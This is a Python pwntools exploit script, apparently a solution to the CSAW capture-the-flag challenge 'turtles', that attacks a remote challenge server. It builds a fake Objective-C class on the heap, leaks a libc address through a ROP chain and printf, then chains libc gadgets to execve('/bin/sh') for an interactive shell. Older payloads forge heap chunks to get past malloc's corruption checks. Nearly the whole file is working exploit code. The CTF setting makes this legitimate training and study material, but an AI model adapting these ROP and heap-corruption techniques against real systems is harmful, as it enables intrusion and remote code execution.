### exploit-turtles.py

from pwn import *
from time import sleep

# Helper functions to convert 64-bit addresses to strings and vice versa
pck = lambda x: struct.pack('Q', x)
unpck = lambda x: struct.unpack('Q', x)

# Helper function, adds null bytes to the end of a hex address so we can pack it
def append_nulls(str):
	n = len(str)
	for i in xrange(8 - n):
		str += '\x00'
	return str

local = False
if local:
    p=process('') # :-)
else:
    p = remote('pwn.chal.csaw.io', 9003)


print(p.recvuntil('0x'))
heap_addr_string = p.recvline()
print("turtle is at " + heap_addr_string)
HEAP_ADDR = int(heap_addr_string,16)


#### Read the location of printf in libc using ROP and a format string attack.
#
## This block of information gets copied to the heap.
#
payload = append_nulls(pck(HEAP_ADDR+0x40)) # point to fake turtle class
payload += append_nulls(pck(0x400d3c)) # ROP
payload += "/bin/sh\x00"
payload += append_nulls(pck(0x0))*3
payload += append_nulls(pck(0x400d3e)) # ROP
payload += append_nulls(pck(0x0))
payload += append_nulls(pck(0x601400)) # optional metaclass pointer
payload += append_nulls(pck(0x0))
payload += append_nulls(pck(0x400d3c)) # ROP
payload += append_nulls(pck(0x21))
payload += append_nulls(pck(0x0)) # fwd1
payload += append_nulls(pck(HEAP_ADDR+0x2c980)) # bck1
payload += append_nulls(pck(0x400d3c)) # &shellcode
payload += append_nulls(pck(0x400d3c)) # ROP
payload += append_nulls(pck(HEAP_ADDR+0x80)) # start of dtable, also &dtable
payload += append_nulls(pck(HEAP_ADDR+0x70)) # dtable: &shellcode (so +0x88 is &&shellcode)
payload += append_nulls(pck(0x0000000000007325)) # test format string: %s
payload += append_nulls(pck(0x0))
payload += append_nulls(pck(0x400d3c)) # ROP
payload += append_nulls(pck(0x0))
payload += append_nulls(pck(0xd2c)) # used during lookup, part of dtable
payload += append_nulls(pck(0x0))*2
#
## I have another 1864 bytes remaining, and the rest of this information stays on the stack.
#
# `0x0000000000400d43 : pop rdi ; ret`
payload += append_nulls(pck(0x400d43))
payload += append_nulls(pck(HEAP_ADDR+0x90)) # string address, to go in %rdi
#
# `0x0000000000400d41 : pop rsi ; pop r15 ; ret`
payload += append_nulls(pck(0x400d41))
payload += append_nulls(pck(0x601290)) # I want to print the contents of this address in the GOT
payload += append_nulls(pck(0x0)) # This will go into r15
#
# I'm running into an alignment issue: I need to get %rsp to be a multiple of 16
# when calling printf. So I return and do nothing once.
payload += append_nulls(pck(0x4009a1)) 
#
# Jump to printf call
payload += append_nulls(pck(0x400c39))
#
# Terminate the read
payload += "\n"
p.send(payload)
#
####

time.sleep(2)
tmp = p.recv(timeout=0.5)
LIBC_ADDR = int(unpck(append_nulls(tmp))[0])
print("libc_addr = " + hex(LIBC_ADDR))

if local:
	PRINTF_OFFSET = 0x0 # :-)
	#ONE_GADGET_OFFSET = 0x0
	#ONE_GADGET_OFFSET_2 = 0x0
	POP_RDI_OFFSET = 0x0
	POP_RDX_OFFSET = 0x0
	POP_RSI_OFFSET = 0x0
	CALL_EXECVE_OFFSET = 0x0
else:
	PRINTF_OFFSET = 0x50cf0
	#ONE_GADGET_OFFSET = 0xd6e77
	#ONE_GADGET_OFFSET_2 = 0xd6e83
	POP_RDI_OFFSET = 0x22482 # pop rdi ; ret
	POP_RDX_OFFSET = 0x1b8e # pop rdx; ret
	POP_RSI_OFFSET = 0x24125 # pop rsi; ret
	CALL_EXECVE_OFFSET = 0xd6e8d # call execve

LIBC_BASE = LIBC_ADDR - PRINTF_OFFSET
print("LIBC_BASE: " + hex(LIBC_BASE))

# Sleeping here is necessary, in order for the program on the server 
# to associate the new information I'm sending with the second read and not the first.
time.sleep(2) 

#### Second payload to ROP a shell.
#
## Data that gets copied to the heap.
payload2 = append_nulls(pck(HEAP_ADDR+0x40)) # point to fake turtle class
payload2 += append_nulls(pck(0x400d3c)) # ROP
payload2 += append_nulls(pck(0x0))*4
payload2 += append_nulls(pck(0x400d3e)) # ROP
payload2 += append_nulls(pck(0x0))
payload2 += append_nulls(pck(0x601400)) # optional metaclass pointer
payload2 += append_nulls(pck(0x0))
payload2 += append_nulls(pck(0x400d3c)) # ROP
payload2 += append_nulls(pck(0x21))
payload2 += append_nulls(pck(0x0)) # fwd1
payload2 += append_nulls(pck(HEAP_ADDR+0x2c980)) # bck1
payload2 += append_nulls(pck(0x400d3c)) # &shellcode
payload2 += append_nulls(pck(0x400d3c)) # ROP
payload2 += append_nulls(pck(HEAP_ADDR+0x80)) # start of dtable, also &dtable
payload2 += append_nulls(pck(HEAP_ADDR+0x70)) # dtable: &shellcode (so +0x88 is &&shellcode)
payload2 += append_nulls(pck(0x0000000000007325)) # test format string: %s
payload2 += append_nulls(pck(0x0))
payload2 += append_nulls(pck(0x400d3c)) # ROP
payload2 += append_nulls(pck(0x4141414141414141)) # Just to get my bearings...
payload2 += append_nulls(pck(0xd2c)) # used during lookup, part of dtable
payload2 += append_nulls(pck(0x0))*2
# I have another 1864 bytes remaining to use on the stack.
#
payload2 += append_nulls(pck(0x0))*5 # The five return addresses I just used
payload2 += "aaaabbbb" # I just wanted to view this on the stack
#
# Start the second ROP chain here.
#
payload2 += append_nulls(pck(LIBC_BASE + POP_RDX_OFFSET))
payload2 += append_nulls(pck(0x0))
payload2 += append_nulls(pck(LIBC_BASE + POP_RSI_OFFSET))
payload2 += append_nulls(pck(0x0))
payload2 += append_nulls(pck(LIBC_BASE + POP_RDI_OFFSET))
payload2 += append_nulls(pck(HEAP_ADDR+0x10)) # pointer to "/bin/sh"
payload2 += append_nulls(pck(LIBC_BASE + CALL_EXECVE_OFFSET))
payload2 += "\n"
#
p.send(payload2)
p.interactive() # profit
####

##########################################################################################
#
# What follows are some old payloads from the part of this write-up where I was trying to 
# figure out the heap corruption problem. I left it in the final, clean version of the code 
# for posterity. Payload 2 below is the code to fit eight free-able fake smallbins into 
# 200 bytes of space on the heap. 
#
##########################################################################################
turtle_class_addr = 0x6014c0
payload = append_nulls(pck(turtle_class_addr))
payload += append_nulls(pck(0x21))
payload += append_nulls(pck(HEAP_ADDR+0x20)) # fake pointer forward to second chunk in order to 
                                             # fool malloc's heap corruption check when allocating 
                                             # the second chunk (happens second)
payload += append_nulls(pck(HEAP_ADDR+0x20)) # fake pointer back to the second chunk in order to finish 
                                   # allocating the second chunk, setting bck->fwd = bin in malloc.c:3651.
payload += append_nulls(pck(0x150000000c)) # data for in-use second chunk
payload += append_nulls(pck(0x21))
payload += append_nulls(pck(HEAP_ADDR+0x60)) # second chunk points forward to fourth chunk, required
payload += append_nulls(pck(HEAP_ADDR)) # second chunk points back to first chunk, required
payload += append_nulls(pck(0x20)) # prev size for freed chunk
payload += append_nulls(pck(0x20)) # size of third chunk and second chunk is free
payload += append_nulls(pck(0x00))*2
payload += append_nulls(pck(0x1d0000000c)) # data for in-use first chunk (probably doesn't matter,
                                           # a lot of these chunks are old Objective-C classes that 
                                           # haven't been drained because there's no NSAutoreleasePool)
payload += append_nulls(pck(0x21)) # size of fourth chunk and third is used
payload += append_nulls(pck(0x0)) # used to be a forward pointer to the second chunk, 
                                  # now it's null because it gets overwritten with data anyway 
                                  # when allocating the fourth chunk (happens first).
payload += append_nulls(pck(HEAP_ADDR+0x20)) # fourth chunk points back to second chunk, required
                                             # when allocating fourth chunk (happens first)
payload += append_nulls(pck(0x20)) # fifth chunk: prev size for freed fourth chunk
payload += append_nulls(pck(0x20)) # fifth chunk: size is 0x20 and fourth chunk is free
payload += append_nulls(pck(0x0))*2
payload += append_nulls(pck(0x1800000010)) # data for sixth chunk (in-use) 
payload += append_nulls(pck(0x21)) # size of seventh chunk and sixth is used
payload += append_nulls(pck(0x0))*3

# 0x13088b0:	0x00000000006014c0	0x0000000000000021
# 0x13088c0:	0x0000000001312640	0x0000000000000000
# 0x13088d0:	0x000000150000000c	0x0000000000000021
# 0x13088e0:	0x000000000133d870	0x0000000001304790
# 0x13088f0:	0x0000000000000020	0x0000000000000020
# 0x1308900:	0x00000000013022a0	0x0000000000000000
# 0x1308910:	0x0000001d0000000c	0x0000000000000021
# 0x1308920:	0x0000000001342660	0x0000000001335230
# 0x1308930:	0x0000000000000020	0x0000000000000020
# 0x1308940:	0x0000000001312650	0x0000000000000000
# 0x1308950:	0x0000001800000010	0x0000000000000021
# 0x1308960:	0x00000000013213e0	0x0000000000000000
# 0x1308970:	0x0000000000000000	0x0000000000000021


# payload2: the new and improved version.
payload2 = append_nulls(pck(turtle_class_addr))
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x60)) # fwd2
payload2 += append_nulls(pck(HEAP_ADDR+0x18)) # bck2
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x0)) # fwd3
payload2 += append_nulls(pck(HEAP_ADDR+0x30)) # bck3
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x18)) # fwd4
payload2 += append_nulls(pck(HEAP_ADDR+0x48)) # bck4
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x30)) # fwd5
payload2 += append_nulls(pck(HEAP_ADDR+0x78)) # bck5
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x60)) # fwd1
payload2 += append_nulls(pck(HEAP_ADDR+0x0)) # bck1
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x48)) # fwd6
payload2 += append_nulls(pck(HEAP_ADDR+0x90)) # bck6
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x78)) # fwd7
payload2 += append_nulls(pck(HEAP_ADDR+0xa8)) # bck7
payload2 += append_nulls(pck(0x20))
payload2 += append_nulls(pck(HEAP_ADDR+0x90)) # fwd8
payload2 += append_nulls(pck(HEAP_ADDR+0xc0)) # bck8

